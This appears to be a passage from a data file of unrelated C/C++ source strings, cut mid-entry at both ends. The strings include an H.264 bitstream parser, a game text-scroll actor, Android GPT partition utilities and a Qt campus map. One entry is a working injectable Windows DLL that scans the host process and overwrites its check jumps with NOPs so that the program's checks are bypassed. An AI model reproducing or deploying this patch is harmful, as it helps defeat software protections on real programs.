\u0448\u0430\u0433 \u043f\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438\nvoid setup_array(double *u, double *phalf1, double *phalf, double *p_",
    "/**\n * \u6700\u7b80\u5355\u7684\u89c6\u97f3\u9891\u6570\u636e\u5904\u7406\u793a\u4f8b\n * Simplest MediaData Test\n *\n * \u96f7\u9704\u9a85 Lei Xiaohua\n * leixiaohua1020@126.com\n * \u4e2d\u56fd\u4f20\u5a92\u5927\u5b66/\u6570\u5b57\u7535\u89c6\u6280\u672f\n * Communication University of China / Digital TV Technology\n * http://blog.csdn.net/leixiaohua1020\n *\n * \u672c\u9879\u76ee\u5305\u542b\u5982\u4e0b\u51e0\u79cd\u89c6\u97f3\u9891\u6d4b\u8bd5\u793a\u4f8b\uff1a\n *  (1)\u50cf\u7d20\u6570\u636e\u5904\u7406\u7a0b\u5e8f\u3002\u5305\u542bRGB\u548cYUV\u50cf\u7d20\u683c\u5f0f\u5904\u7406\u7684\u51fd\u6570\u3002\n *  (2)\u97f3\u9891\u91c7\u6837\u6570\u636e\u5904\u7406\u7a0b\u5e8f\u3002\u5305\u542bPCM\u97f3\u9891\u91c7\u6837\u683c\u5f0f\u5904\u7406\u7684\u51fd\u6570\u3002\n *  (3)H.264\u7801\u6d41\u5206\u6790\u7a0b\u5e8f\u3002\u53ef\u4ee5\u5206\u79bb\u5e76\u89e3\u6790NALU\u3002\n *  (4)AAC\u7801\u6d41\u5206\u6790\u7a0b\u5e8f\u3002\u53ef\u4ee5\u5206\u79bb\u5e76\u89e3\u6790ADTS\u5e27\u3002\n *  (5)FLV\u5c01\u88c5\u683c\u5f0f\u5206\u6790\u7a0b\u5e8f\u3002\u53ef\u4ee5\u5c06FLV\u4e2d\u7684MP3\u97f3\u9891\u7801\u6d41\u5206\u79bb\u51fa\u6765\u3002\n *  (6)UDP-RTP\u534f\u8bae\u5206\u6790\u7a0b\u5e8f\u3002\u53ef\u4ee5\u5c06\u5206\u6790UDP/RTP/MPEG-TS\u6570\u636e\u5305\u3002\n *\n * This project contains following samples to handling multimedia data:\n *  (1) Video pixel data handling program. It contains several examples to handle RGB and YUV data.\n *  (2) Audio sample data handling program. It contains several examples to handle PCM data.\n *  (3) H.264 stream analysis program. It can parse H.264 bitstream and analysis NALU of stream.\n *  (4) AAC stream analysis program. It can parse AAC bitstream and analysis ADTS frame of stream.\n *  (5) FLV format analysis program. It can analysis FLV file and extract MP3 audio stream.\n *  (6) UDP-RTP protocol analysis program. It can analysis UDP/RTP/MPEG-TS Packet.\n *\n */\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef enum {\n\tNALU_TYPE_SLICE    = 1,\n\tNALU_TYPE_DPA      = 2,\n\tNALU_TYPE_DPB      = 3,\n\tNALU_TYPE_DPC      = 4,\n\tNALU_TYPE_IDR      = 5,\n\tNALU_TYPE_SEI      = 6,\n\tNALU_TYPE_SPS      = 7,\n\tNALU_TYPE_PPS      = 8,\n\tNALU_TYPE_AUD      = 9,\n\tNALU_TYPE_EOSEQ    = 10,\n\tNALU_TYPE_EOSTREAM = 11,\n\tNALU_TYPE_FILL     = 12,\n} NaluType;\n\ntypedef enum {\n\tNALU_PRIORITY_DISPOSABLE = 0,\n\tNALU_PRIRITY_LOW         = 1,\n\tNALU_PRIORITY_HIGH       = 2,\n\tNALU_PRIORITY_HIGHEST    = 3\n} NaluPriority;\n\n\ntypedef struct\n{\n\tint startcodeprefix_len;      //! 4 for parameter sets and first slice in picture, 3 for everything else (suggested)\n\tunsigned len;                 //! Length of the NAL unit (Excluding the start code, which does not belong to the NALU)\n\tunsigned max_size;            //! Nal Unit Buffer size\n\tint forbidden_bit;            //! should be always FALSE\n\tint nal_reference_idc;        //! NALU_PRIORITY_xxxx\n\tint nal_unit_type;            //! NALU_TYPE_xxxx    \n\tchar *buf;                    //! contains the first byte followed by the EBSP\n} NALU_t;\n\nFILE *h264bitstream = NULL;                //!< the bit stream file\n\nint info2=0, info3=0;\n\nstatic int FindStartCode2 (unsigned char *Buf){\n\tif(Buf[0]!=0 || Buf[1]!=0 || Buf[2] !=1) return 0; //0x000001?\n\telse return 1;\n}\n\nstatic int FindStartCode3 (unsigned char *Buf){\n\tif(Buf[0]!=0 || Buf[1]!=0 || Buf[2] !=0 || Buf[3] !=1) return 0;//0x00000001?\n\telse return 1;\n}\n\n\nint GetAnnexbNALU (NALU_t *nalu){\n\tint pos = 0;\n\tint StartCodeFound, rewind;\n\tunsigned char *Buf;\n\n\tif ((Buf = (unsigned char*)calloc (nalu->max_size , sizeof(char))) == NULL) \n\t\tprintf (\"GetAnnexbNALU: Could not allocate Buf memory\\n\");\n\n\tnalu->startcodeprefix_len=3;\n\n\tif (3 != fread (Buf, 1, 3, h264bitstream)){\n\t\tfree(Buf);\n\t\treturn 0;\n\t}\n\tinfo2 = FindStartCode2 (Buf);\n\tif(info2 != 1) {\n\t\tif(1 != fread(Buf+3, 1, 1, h264bitstream)){\n\t\t\tfree(Buf);\n\t\t\treturn 0;\n\t\t}\n\t\tinfo3 = FindStartCode3 (Buf);\n\t\tif (info3 != 1){ \n\t\t\tfree(Buf);\n\t\t\treturn -1;\n\t\t}\n\t\telse {\n\t\t\tpos = 4;\n\t\t\tnalu->startcodeprefix_len = 4;\n\t\t}\n\t}\n\telse{\n\t\tnalu->startcodeprefix_len = 3;\n\t\tpos = 3;\n\t}\n\tStartCodeFound = 0;\n\tinfo2 = 0;\n\tinfo3 = 0;\n\n\twhile (!StartCodeFound){\n\t\tif (feof (h264bitstream)){\n\t\t\tnalu->len = (pos-1)-nalu->startcodeprefix_len;\n\t\t\tmemcpy (nalu->buf, &Buf[nalu->startcodeprefix_len], nalu->len);     \n\t\t\tnalu->forbidden_bit = nalu->buf[0] & 0x80; //1 bit\n\t\t\tnalu->nal_reference_idc = nalu->buf[0] & 0x60; // 2 bit\n\t\t\tnalu->nal_unit_type = (nalu->buf[0]) & 0x1f;// 5 bit\n\t\t\tfree(Buf);\n\t\t\treturn pos-1;\n\t\t}\n\t\tBuf[pos++] = fgetc (h264bitstream);\n\t\tinfo3 = FindStartCode3(&Buf[pos-4]);\n\t\tif(info3 != 1)\n\t\t\tinfo2 = FindStartCode2(&Buf[pos-3]);\n\t\tStartCodeFound = (info2 == 1 || info3 == 1);\n\t}\n\n\t// Here, we have found another start code (and read length of startcode bytes more than we should\n\t// have.  Hence, go back in the file\n\trewind = (info3 == 1)? -4 : -3;\n\n\tif (0 != fseek (h264bitstream, rewind, SEEK_CUR)){\n\t\tfree(Buf);\n\t\tprintf(\"GetAnnexbNALU: Cannot fseek in the bit stream file\");\n\t}\n\n\t// Here the Start code, the complete NALU, and the next start code is in the Buf.  \n\t// The size of Buf is pos, pos+rewind are the number of bytes excluding the next\n\t// start code, and (pos+rewind)-startcodeprefix_len is the size of the NALU excluding the start code\n\n\tnalu->len = (pos+rewind)-nalu->startcodeprefix_len;\n\tmemcpy (nalu->buf, &Buf[nalu->startcodeprefix_len], nalu->len);//\n\tnalu->forbidden_bit = nalu->buf[0] & 0x80; //1 bit\n\tnalu->nal_reference_idc = nalu->buf[0] & 0x60; // 2 bit\n\tnalu->nal_unit_type = (nalu->buf[0]) & 0x1f;// 5 bit\n\tfree(Buf);\n\n\treturn (pos+rewind);\n}\n\n/**\n * Analysis H.264 Bitstream\n * @param url    Location of input H.264 bitstream file.\n */\nint simplest_h264_parser(char *url){\n\n\tNALU_t *n;\n\tint buffersize=100000;\n\n\t//FILE *myout=fopen(\"output_log.txt\",\"wb+\");\n\tFILE *myout=stdout;\n",
    "#include <Windows.h>\r\n#include <iostream>\r\n#include <vector>\r\n\r\n\r\nextern \"C\" __declspec(dllexport) int WindowHook(int code, WPARAM wParam, LPARAM lParam) { return CallNextHookEx(NULL, code, wParam, lParam); }\r\n\r\nuint8_t* SigScan(const HMODULE module, const std::string& byte_array, int skip = 0) {\r\n\tif (!module)\r\n\t\treturn nullptr;\r\n\r\n\tstatic auto pattern_to_byte = [](const char* pattern) {\r\n\t\tauto bytes = std::vector<int>{};\r\n\t\tconst auto start = const_cast<char*>(pattern);\r\n\t\tconst auto end = const_cast<char*>(pattern) + std::strlen(pattern);\r\n\r\n\t\tfor (auto current = start; current < end; ++current) {\r\n\t\t\tif (*current == '?') {\r\n\t\t\t\t++current;\r\n\r\n\t\t\t\tif (*current == '?')\r\n\t\t\t\t\t++current;\r\n\r\n\t\t\t\tbytes.push_back(-1);\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tbytes.push_back(std::strtoul(current, &current, 16));\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn bytes;\r\n\t};\r\n\r\n\tconst auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(module);\r\n\tconst auto nt_headers =\r\n\t\treinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<std::uint8_t*>(module) + dos_header->e_lfanew);\r\n\r\n\tconst auto size_of_image = nt_headers->OptionalHeader.SizeOfImage;\r\n\tconst auto pattern_bytes = pattern_to_byte(byte_array.c_str());\r\n\tconst auto scan_bytes = reinterpret_cast<std::uint8_t*>(module);\r\n\r\n\tconst auto pattern_size = pattern_bytes.size();\r\n\tconst auto pattern_data = pattern_bytes.data();\r\n\r\n\tfor (auto i = 0ul; i < size_of_image - pattern_size; ++i) {\r\n\t\tbool found = true;\r\n\r\n\t\tfor (auto j = 0ul; j < pattern_size; ++j) {\r\n\t\t\tif (scan_bytes[i + j] != pattern_data[j] && pattern_data[j] != -1) {\r\n\t\t\t\tfound = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (found)\r\n\t\t\treturn &scan_bytes[i];\r\n\t}\r\n\r\n\treturn nullptr;\r\n}\r\n\r\n\r\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {\r\n\r\n\tif (ul_reason_for_call == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\t//auto jz_addr = SigScan(GetModuleHandle(0), \"0F 84 9B 13 00 00\"); // 0f 84 9b 13 00 00       jz     addr\r\n\t\t//auto jz_addr = SigScan(GetModuleHandle(0), \"0F 84 4D 14 00 00\"); // 0f 84 9b 13 00 00       jz     addr\r\n\t\tauto jz_addr = SigScan(GetModuleHandle(0), \"0F 84 BD 06 00 00 48 83\"); // Jump if check passed\r\n\t\tif (!jz_addr)\r\n\t\t\texit(-1);\r\n\r\n\t\tDWORD old;\r\n\t\tif (!VirtualProtect(jz_addr, 0x8, PAGE_EXECUTE_READWRITE, &old))\r\n\t\t\texit(-2);\r\n\r\n\r\n\t\t*(char*)(jz_addr) = 0x90;\r\n\t\t*(char*)(jz_addr + 1) = 0x90;\r\n\t\t*(char*)(jz_addr + 2) = 0x90;\r\n\t\t*(char*)(jz_addr + 3) = 0x90;\r\n\t\t*(char*)(jz_addr + 4) = 0x90;\r\n\t\t*(char*)(jz_addr + 5) = 0x90; // removes the compare statement\r\n\r\n\t\tVirtualProtect(jz_addr, 0x8, old, &old);\r\n\t\tBeep(1000, 1000);\r\n\r\n\t\t//Next Check\r\n\r\n\t\tauto jz_addr1 = SigScan(GetModuleHandle(0), \"0F 84 D8 00 00 00 48 8D\"); // Jump if check passed\r\n\t\tif (!jz_addr1)\r\n\t\t\texit(-1);\r\n\r\n\t\tDWORD old1;\r\n\t\tif (!VirtualProtect(jz_addr1, 0x8, PAGE_EXECUTE_READWRITE, &old1))\r\n\t\t\texit(-2);\r\n\r\n\t\t*(char*)(jz_addr1) = 0x90;\r\n\t\t*(char*)(jz_addr1 + 1) = 0x90;\r\n\t\t*(char*)(jz_addr1 + 2) = 0x90;\r\n\t\t*(char*)(jz_addr1 + 3) = 0x90;\r\n\t\t*(char*)(jz_addr1 + 4) = 0x90;\r\n\t\t*(char*)(jz_addr1 + 5) = 0x90; // removes the compare statement\r\n\r\n\r\n\t\tVirtualProtect(jz_addr1, 0x8, old1, &old1);\r\n\t\tBeep(1000, 1000);\r\n\r\n\t\t//Next Check\r\n\r\n\t\tauto jz_addr2 = SigScan(GetModuleHandle(0), \"0F 84 D8 00 00 00 48 8D\"); // Jump if check passed\r\n\t\tif (!jz_addr2)\r\n\t\t\texit(-1);\r\n\r\n\t\tDWORD old2;\r\n\t\tif (!VirtualProtect(jz_addr2, 0x8, PAGE_EXECUTE_READWRITE, &old2))\r\n\t\t\texit(-2);\r\n\r\n\t\t*(char*)(jz_addr2) = 0x90;\r\n\t\t*(char*)(jz_addr2 + 1) = 0x90;\r\n\t\t*(char*)(jz_addr2 + 2) = 0x90;\r\n\t\t*(char*)(jz_addr2 + 3) = 0x90;\r\n\t\t*(char*)(jz_addr2 + 4) = 0x90;\r\n\t\t*(char*)(jz_addr2 + 5) = 0x90; // removes the compare statement\r\n\r\n\r\n\t\tVirtualProtect(jz_addr2, 0x8, old2, &old2);\r\n\t\tBeep(1000, 1000);\r\n\r\n\t}\r\n\treturn TRUE;\r\n}",
    "#include \"TextScrollActor.h\"\r\n#include \"Engine/Engine.h\"\r\n#include \"Game/Game.h\"\r\n\r\nTextScrollActor::TextScrollActor(const char* message)\r\n{\r\n\t// \ubb38\uc790\uc5f4 \uae38\uc774 \uad6c\ud558\uae30.\r\n\tlength = (int)strlen(message);\r\n\r\n\t// \ubb38\uc790\uc5f4 \ubcf5\uc0ac.\r\n\tstring = new char[length + 1];\r\n\tstrcpy_s(string, length + 1, message);\r\n\r\n\ttemp = new char[printWidth + 1];\r\n\r\n\t// \ucee4\uc11c \uac10\ucd94\uae30.\r\n\tEngine::Get().SetCursorType(CursorType::NoCursor);\r\n}\r\n\r\nTextScrollActor::~TextScrollActor()\r\n{\r\n\tdelete[] string;\r\n\tdelete[] temp;\r\n}\r\n\r\nvoid TextScrollActor::Update(float deltaTime)\r\n{\r\n\t// ESC \uc885\ub8cc.\r\n\tif (Engine::Get().GetKeyDown(VK_ESCAPE))\r\n\t{\r\n\t\t//Engine::Get().QuitGame();\r\n\t\tGame::Get().ToggleMenu();\r\n\t}\r\n\r\n\t// \uc88c\uc6b0 \ubc29\ud5a5\ud0a4 \uc785\ub825 \ucc98\ub9ac.\r\n\tif (Engine::Get().GetKey(VK_LEFT))\r\n\t{\r\n\t\t// \ubc29\ud5a5 \uc124\uc815.\r\n\t\tdirection = Direction::Left;\r\n\t\tshouldUpdate = true;\r\n\t}\r\n\t\r\n\tif (Engine::Get().GetKey(VK_RIGHT))\r\n\t{\r\n\t\t// \ubc29\ud5a5 \uc124\uc815.\r\n\t\tdirection = Direction::Right;\r\n\t\tshouldUpdate = true;\r\n\t}\r\n\t\r\n\t// \ubc29\ud5a5\ud0a4\uac00 \uc548\ub20c\ub838\ub294\uc9c0 \ud655\uc778.\r\n\tif (!Engine::Get().GetKey(VK_LEFT) && !Engine::Get().GetKey(VK_RIGHT))\r\n\t{\r\n\t\tshouldUpdate = false;\r\n\t}\r\n\r\n\t// \ub51c\ub808\uc774 \uacc4\uc0b0.\r\n\telapsedTime += deltaTime;\r\n\t// \uc2dc\uac04\uc774 \ubaa8\ub450 \uacbd\uacfc \ud588\ub294\uc9c0 \ud655\uc778.\r\n\tif (elapsedTime < delayTime)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\r\n\t// \uc2dc\uac04\uc774 \uacbd\uacfc \ud588\uc73c\uba74 \ub2e4\uc74c \uacc4\uc0b0\uc744 \uc704\ud574 \ucd08\uae30\ud654.\r\n\telapsedTime = 0.0f;\r\n\r\n\tif (shouldUpdate)\r\n\t{\r\n\t\tif (direction == Direction::Right)\r\n\t\t{\r\n\t\t\t// \ud654\uba74\uc5d0 \uadf8\ub9b4 \ubb38\uc790\uc5f4\uc758 \uc2dc\uc791 \uc778\ub371\uc2a4 \uc5c5\ub370\uc774\ud2b8.\r\n\t\t\tindex = (index - 1 + length) % length;\r\n\t\t}\r\n\r\n\t\telse if (direction == Direction::Left)\r\n\t\t{\r\n\t\t\t// \ud654\uba74\uc5d0 \uadf8\ub9b4 \ubb38\uc790\uc5f4\uc758 \uc2dc\uc791 \uc778\ub371\uc2a4 \uc5c5\ub370\uc774\ud2b8.\r\n\t\t\tindex = (index + 1) % length;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid TextScrollActor::Draw()\r\n{\r\n\t// \uc784\uc2dc \ubb38\uc790\uc5f4 \ubc84\ud37c.\r\n\t//char* temp = new char[printWidth + 1];\r\n\tint tempIndex = index;\r\n\r\n\tfor (int ix = 0; ix < printWidth; ++ix)\r\n\t{\r\n\t\ttemp[ix] = string[tempIndex];\r\n\t\ttempIndex = (tempIndex + 1) % length;\r\n\t}\r\n\r\n\ttemp[printWidth] = '\\0';\r\n\tLog(temp);\r\n\r\n\t//delete[] temp;\r\n\tEngine::Get().SetCursorPosition(0, 0);\r\n}",
    "/*\n * Copyright (c) 2013,2016,2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#define _LARGEFILE64_SOURCE /* enable lseek64() */\n\n/******************************************************************************\n * INCLUDE SECTION\n ******************************************************************************/\n#include <fcntl.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <unistd.h>\n#include <linux/fs.h>\n#include <limits.h>\n#include <dirent.h>\n#include <linux/kernel.h>\n#include <map>\n#include <vector>\n#include <string>\n#ifndef __STDC_FORMAT_MACROS\n#define __STDC_FORMAT_MACROS\n#endif\n#include <inttypes.h>\n\n\n#define LOG_TAG \"gpt-utils\"\n#include <cutils/log.h>\n#include <cutils/properties.h>\n#include \"gpt-utils.h\"\n#include <zlib.h>\n#include <endian.h>\n\n\n/******************************************************************************\n * DEFINE SECTION\n ******************************************************************************/\n#define BLK_DEV_FILE    \"/dev/block/mmcblk0\"\n/* list the names of the backed-up partitions to be swapped */\n/* extension used for the backup partitions - tzbak, abootbak, etc. */\n#define BAK_PTN_NAME_EXT    \"bak\"\n#define XBL_PRIMARY         \"/dev/block/bootdevice/by-name/xbl\"\n#define XBL_BACKUP          \"/dev/block/bootdevice/by-name/xblbak\"\n#define XBL_AB_PRIMARY      \"/dev/block/bootdevice/by-name/xbl_a\"\n#define XBL_AB_SECONDARY    \"/dev/block/bootdevice/by-name/xbl_b\"\n/* GPT defines */\n#define MAX_LUNS                    26\n//This will allow us to get the root lun path from the path to the partition.\n//i.e: from /dev/block/sdaXXX get /dev/block/sda. The assumption here is that\n//the boot critical luns lie between sda to sdz which is acceptable because\n//only user added external disks,etc would lie beyond that limit which do not\n//contain partitions that interest us here.\n#define PATH_TRUNCATE_LOC (sizeof(\"/dev/block/sda\") - 1)\n\n//From /dev/block/sda get just sda\n#define LUN_NAME_START_LOC (sizeof(\"/dev/block/\") - 1)\n#define BOOT_LUN_A_ID 1\n#define BOOT_LUN_B_ID 2\n/******************************************************************************\n * MACROS\n ******************************************************************************/\n\n\n#define GET_4_BYTES(ptr)    ((uint32_t) *((uint8_t *)(ptr)) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 3) << 24))\n\n#define GET_8_BYTES(ptr)    ((uint64_t) *((uint8_t *)(ptr)) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 3) << 24) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 4) << 32) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 5) << 40) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 6) << 48) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 7) << 56))\n\n#define PUT_4_BYTES(ptr, y)   *((uint8_t *)(ptr)) = (y) & 0xff; \\\n        *((uint8_t *)(ptr) + 1) = ((y) >> 8) & 0xff; \\\n        *((uint8_t *)(ptr) + 2) = ((y) >> 16) & 0xff; \\\n        *((uint8_t *)(ptr) + 3) = ((y) >> 24) & 0xff;\n\n/******************************************************************************\n * TYPES\n ******************************************************************************/\nusing namespace std;\nenum gpt_state {\n    GPT_OK = 0,\n    GPT_BAD_SIGNATURE,\n    GPT_BAD_CRC\n};\n//List of LUN's containing boot critical images.\n//Required in ",
    "#include \"map.h\"\r\n#include \"ui_map.h\"\r\n#include <QPainter>\r\n#include <QPixmap>\r\n#include<QMessageBox>\r\nMap::Map(QWidget *parent)\r\n    : QWidget(parent)\r\n    , ui(new Ui::Map)\r\n{\r\n    ui->setupUi(this);\r\n    setFixedSize(width(), height());\r\n    ui->textEdit->setReadOnly(true);\r\n    ui->photoshow->setText(\"\u70b9\u51fb\u5bf9\u5e94\u4f4d\u7f6e\u5373\u53ef\u5c55\u793a\u56fe\u7247\u4e0e\u4ecb\u7ecd\");\r\n\r\n}\r\n\r\nMap::~Map()\r\n{\r\n    delete ui;\r\n}\r\n\r\n\r\nvoid Map::mousePressEvent(QMouseEvent* event)\r\n{\r\n    int currentTabIndex=ui->tabWidget->currentIndex();\r\n    qDebug()<<\"\u73b0\u5728\u7684tab\u6807\u7b7e\u662f\"<<currentTabIndex;\r\n    qDebug() << \"Clicked at:\" << event->pos();\r\n    QPoint clickPos = event->pos();\r\n\r\n    if(currentTabIndex==0)//\u9632\u6b62\u5728\u6267\u884c\u4e00\u4e2atab\u7684\u5185\u5bb9\u65f6\u5019\uff0c\u53e6\u4e00\u4e2atab\u4e5f\u6267\u884c\uff0c\u51cf\u5c11\u4e0d\u5fc5\u8981\u6d88\u8017\r\n    {\r\n\r\n        // \u904d\u5386\u9876\u70b9\uff0c\u5224\u65ad\u662f\u5426\u70b9\u51fb\u5230\u67d0\u4e2a\u9876\u70b9\r\n        for (const auto& vertex : adjMatrix.vertices)\r\n        {\r\n            if (QLineF(clickPos, vertex.position).length() <= 10)\r\n            { // \u5224\u65ad\u70b9\u51fb\u8303\u56f4\r\n                // \u66f4\u65b0\u53f3\u4fa7 TabWidget \u7684 Label\r\n                QPixmap image(vertex.imagePath);\r\n                if (!image.isNull())\r\n                {\r\n                    ui->photoshow->setPixmap(image.scaled(ui->photoshow->size(), Qt::KeepAspectRatio));\r\n                    ui->textEdit->setText(vertex.description);\r\n                } else\r\n                {\r\n                    ui->photoshow->setText(\"\u56fe\u7247\u672a\u627e\u5230\");\r\n\r\n                }\r\n                return;\r\n            }\r\n        }\r\n        // \u82e5\u672a\u70b9\u51fb\u5230\u4efb\u4f55\u9876\u70b9\uff0c\u6e05\u7a7a Label\r\n        ui->photoshow->setText(\"\u70b9\u51fb\u5bf9\u5e94\u4f4d\u7f6e\u5373\u53ef\u5c55\u793a\u56fe\u7247\u4e0e\u4ecb\u7ecd\");\r\n\r\n        ui->textEdit->clear();\r\n    }\r\n    else if(currentTabIndex==1)\r\n    {\r\n\r\n        for (const auto& vertex : adjMatrix.vertices)\r\n        {\r\n            if (QLineF(clickPos, vertex.position).length() <= 10)\r\n            {\r\n                if (!startSelected)\r\n                {\r\n                    // \u9009\u62e9\u8d77\u70b9\r\n                    startPoint = vertex.position;\r\n                    startSelected = true;\r\n                    ui->label_3->setText(\"\u8d77\u70b9\u5df2\u9009\u62e9: \" + vertex.name);\r\n                    ui->textEdit_2->setText(\"\u8d77\u70b9\u5df2\u9009\u62e9\");\r\n                     ui->label_4->setText(\"\u7ec8\u70b9\u9009\u62e9: \" );\r\n                }\r\n                else\r\n                {\r\n                    // \u9009\u62e9\u7ec8\u70b9\u5e76\u67e5\u8be2\u8def\u5f84\r\n                    endPoint = vertex.position;\r\n\r\n                    ui->label_4->setText(\"\u7ec8\u70b9\u5df2\u9009\u62e9: \" + vertex.name);\r\n                     ui->textEdit_2->setText(\"\u7ec8\u70b9\u5df2\u9009\u62e9\");\r\n\r\n                    QString startName, endName;\r\n\r\n                    for (const auto& v : adjMatrix.vertices)\r\n                    {\r\n                        if (v.position == startPoint) startName = v.name;\r\n                        if (v.position == endPoint) endName = v.name;\r\n                    }\r\n\r\n\r\n                    queryShortestPath(startName, endName);\r\n                    startSelected = false;  // \u91cd\u7f6e\u8d77\u70b9\u9009\u62e9\r\n                    queryAllPaths(startName, endName);\r\n                    update();\r\n                }\r\n                return;\r\n            }\r\n\r\n        }\r\n        ui->textEdit_2->setText(\"\u672a\u9009\u62e9\u4efb\u4f55\u666f\u70b9\");\r\n\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nvoid Map::paintEvent(QPaintEvent* ) {\r\n\r\n\r\n    // \u521b\u5efa QPainter \u5bf9\u8c61\r\n    QPainter painter(this);\r\n\r\n    // \u52a0\u8f7d\u5730\u56fe\u56fe\u7247\r\n    QPixmap map(\":/new/prefix1/suep_photo/map.jpg\"); // \u66ff\u6362\u4e3a\u4f60\u7684\u56fe\u7247\u8def\u5f84\r\n\r\n    // \u7ed8\u5236\u56fe\u7247\r\n    painter.drawPixmap(0, 0, 1180, 820, map);\r\n\r\n\r\n    painter.setBrush(QColor(255, 0, 0)); // \u8bbe\u7f6e\u586b\u5145\u989c\u8272\u4e3a\u660e\u4eae\u7684\u7ea2\u8272\r\n    painter.setPen(Qt::NoPen);           // \u53bb\u9664\u8fb9\u6846\r\n    for (const auto& vertex : adjMatrix.vertices)\r\n    {\r\n        painter.drawEllipse(vertex.position, 15, 15);  // \u7ed8\u5236\u7ea2\u8272\u5706\u70b9\r\n         painter.setPen(Qt::black);\r\n        QFont font = painter.font();\r\n        font.setBold(true);                 // \u52a0\u7c97\u5b57\u4f53\r\n        painter.setFont(font);\r\n\r\n        // \u7ed8\u5236\u666f\u70b9\u540d\u79f0\r\n        painter.drawText(vertex.position + QPoint(-10, 5), vertex.name);\r\n\r\n        // \u6062\u590d\u65e0\u8fb9\u6846\u8bbe\u7f6e\r\n        painter.setPen(Qt::NoPen);\r\n\r\n\r\n    }\r\n\r\n\r\n    // \u7ed8\u5236\u8fde\u63a5\u7ebf\r\n    painter.setPen(QPen(Qt::blue, 2)); // \u4f7f\u7528\u84dd\u8272\u7b14\u7ed8\u5236\u8fde\u7ebf\uff0c\u7ebf\u5bbd\u4e3a2\r\n    for (int i = 0; i < adjMatrix.adjacencyMatrix.size(); ++i)\r\n    {\r\n        for (int j = i + 1; j < adjMatrix.adjacencyMatrix.size(); ++j) { // j \u4ece i + 1 \u5f00\u59cb\uff0c\u907f\u514d\u91cd\u590d\u7ed8\u5236\r\n            if (adjMatrix.adjacencyMatrix[i][j] > 0) { // \u5b58\u5728\u8fde\u63a5\r\n                // \u83b7\u53d6\u9876\u70b9 i \u548c j \u7684\u4f4d\u7f6e\r\n                QPoint start = adjMatrix.vertices[i].position;\r\n                QPoint end = adjMatrix.vertices[j].position;\r\n\r\n                // \u7ed8\u5236\u8fde\u63a5\u7ebf\r\n                painter.drawLine(start, end);\r\n\r\n                // \u8ba1\u7b97\u7ebf\u6761\u7684\u4e2d\u70b9\u4f4d\u7f6e\u7528\u4e8e\u663e\u793a\u6743\u503c\r\n                QPoint midPoint((start.x() + end.x()) / 2, (start.y() + end.y()) / 2);\r\n\r\n                // \u83b7\u53d6\u8be5\u8fb9\u7684\u6743\u503c\u5e76\u7ed8\u5236\r\n                QString weight = QString::number(adjMatrix.adjacencyMatrix[i][j]);\r\n\r\n                // \u8bbe\u7f6e\u6743\u503c\u6587\u672c\u7684\u989c\u8272\u4e3a\u7d2b\u8272\r\n                painter.setPen(QColor(Qt::black)); // \u7d2b\u8272\r\n\r\n                // \u8bbe\u7f6e\u5b57\u4f53\u4e3a\u52a0\u7c97\u4e14\u589e\u5927\r\n                QFont weightFont = painter.font();\r\n                weightFont.setPointSize(12); // \u8bbe\u7f6e\u5b57\u4f53\u5927\u5c0f\u4e3a12\uff08\u60a8\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8c03\u6574\uff09\r\n                weightFont.setBold(true);      // \u52a0\u7c97\u5b57\u4f53\r\n                painter.setFont(weightFont);\r\n\r\n                // \u7ed8\u5236\u6743\u503c\u6587\u672c\r\n                painter.drawText(midPoint, weight);\r\n\r\n                // \u6062\u590d\u7ed8\u5236\u8fde\u63a5\u7ebf\u7684\u989c",
